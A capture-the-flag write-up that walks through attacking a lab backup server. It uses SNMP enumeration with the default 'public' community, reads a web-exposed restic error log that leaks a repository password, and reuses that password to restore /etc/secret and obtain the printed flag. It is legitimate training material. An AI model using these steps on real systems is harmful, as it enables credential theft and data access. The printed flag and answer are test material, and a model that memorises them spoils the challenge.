# Admin Johnson

## Challenge

Hi, TCC-CSIRT analyst,

Admin Johnson began testing backup procedures on the server `johnson-backup.cypherfix.tcc`, but left the process incomplete due to other interesting tasks. Your task is to determine whether the current state is exploitable.

See you in the next incident!

## Solution

### 1. Enumeration

We started by scanning the target server for open ports:

```bash
nmap johnson-backup.cypherfix.tcc

PORT    STATE SERVICE
80/tcp  open  http
199/tcp open  smux
```

### 2. Inspecting the Web Server

We checked the web server at http://johnson-backup.cypherfix.tcc/, but it only displayed the default Apache page with no additional content.

### 3. SNMP Enumeration

Next, we enumerated the SNMP service running on the server using snmpwalk:

```bash
snmpwalk -v2c -c public johnson-backup.cypherfix.tcc
```

The output revealed several processes running on the server, including one of particular interest:

```
iso.3.6.1.2.1.25.4.2.1.5.18 = STRING: "-c /etc/scripts/restic.sh >> /var/www/html/1790c4c2883ad30be0222a3a93004e66/restic.err.log 2>&1"
```

### 4. Inspecting the Restic Log File

We fetched the error log using curl:

```bash
curl http://johnson-backup.cypherfix.tcc/1790c4c2883ad30be0222a3a93004e66/restic.err.log

restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test check
using temporary cache in /tmp/restic-check-cache-3629819862
create exclusive lock for repository
Save(<lock/66761ff991>) returned error, retrying after 552.330144ms: server response unexpected: 500 Internal Server Error (500)
Save(<lock/66761ff991>) returned error, retrying after 1.080381816s: server response unexpected: 500 Internal Server Error (500)
...
```

The log provided valuable information, including a password for another backup server. The backup server `restic-server.cypherfix.tcc` and password `KGDkjgsdsdg883hhd` were discovered from the log.

### 5. Listing Snapshots

To bypass the locking issue mentioned in the log, we used the `--no-lock` parameter. Then, we listed available snapshots in the Restic repository:

```bash
restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test snapshots --no-lock
enter password for repository: 
repository 902ea39d opened (version 2, compression level auto)
ID        Time                 Host          Tags        Paths
--------------------------------------------------------------------
8dfb6a02  2024-10-14 22:56:18  fcf671955256              /etc/secret
--------------------------------------------------------------------
1 snapshots
```

### 6. Restoring the Secret

We restored the contents of the /etc/secret directory from the snapshot:

```bash
restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test restore 8dfb6a02 --target restore --no-lock
```

The snapshot contained a secret file, and after restoring it, we found the flag.

## Flag

```
FLAG{OItn-zKZW-cht7-RNH4}
```
